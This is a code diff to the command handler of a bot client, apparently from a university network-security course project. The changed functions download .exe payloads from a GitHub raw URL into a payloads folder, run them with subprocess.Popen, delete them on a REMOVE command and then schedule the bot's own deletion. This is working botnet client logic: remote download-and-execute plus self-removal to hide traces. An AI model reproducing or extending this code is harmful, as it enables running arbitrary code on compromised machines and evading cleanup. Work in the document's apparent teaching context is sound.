@@ -12,6 +12,7 @@ class CommandHandler:
     def __init__(self, bot, crypt):
         self.bot = bot
         self.crypt = crypt
+        self.payloads = []
         self.__init_os_info()
 
     def __init_os_info(self):
@@ -51,7 +52,10 @@ class CommandHandler:
     # Download the payload from a specified URL and save it to the bot's system
     def __download_payload(self, id: str):
         payloadURL = f"https://raw.githubusercontent.com/WannesDH-2261159/BNS_BN_22/main/{id}.exe"
-        outputFile = f"{id}.exe"
+        outputFile = f"payloads/{id}.exe"
+
+        # Ensure the payloads directory exists
+        os.makedirs("payloads", exist_ok=True)
 
         print(f"Downloading payload... from URL: {payloadURL}")
         r = requests.get(payloadURL)
@@ -66,7 +70,7 @@ class CommandHandler:
     # Execute the payload on the bot's system, handle any errors that may occur during execution
     def __executePayload(self, id: str):
         print("Executing Payload...")
-        payload_name = f"{id}.exe"
+        payload_name = f"payloads/{id}.exe"
         self.payloads.append(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
         print("Payload executed successfully.")
 
@@ -97,6 +101,18 @@ class CommandHandler:
             print(f"Bot announced status successfully.")
         else:
             print(f"Bot failed to announce status.")
+
+
+
+    # Remove all payload files from the bot's system
+    def __cleanupPayloads(self):
+        path = "./payloads"
+        dir_list = os.listdir(path)
+
+        for file in dir_list:
+            os.remove(path + "/" + file)
+        os.removedirs(path)
+
 
 
     def __schedule_self_delete(self):
@@ -139,19 +155,7 @@ class CommandHandler:
             self.__stopPayload()
         elif cmd == Command.REMOVE:
             self.__stopPayload()
-            # TODO: Remove payload
+            self.__cleanupPayloads()
             self.__schedule_self_delete()
         else:
             print ("Received unknown command, ignoring...")
-
-
-    # Remove all payload files from the bot's system
-    def cleanupPayloads(self):
-        path = "C:/Users/User/Desktop/uhasselt/Basic Networc Security/code/remove self/dir"
-        dir_list = os.listdir(path)
-
-        print(sys.argv[0])
-
-        for file in dir_list:
-            os.remove(path + "/" + file)
-        os.removedirs(path)
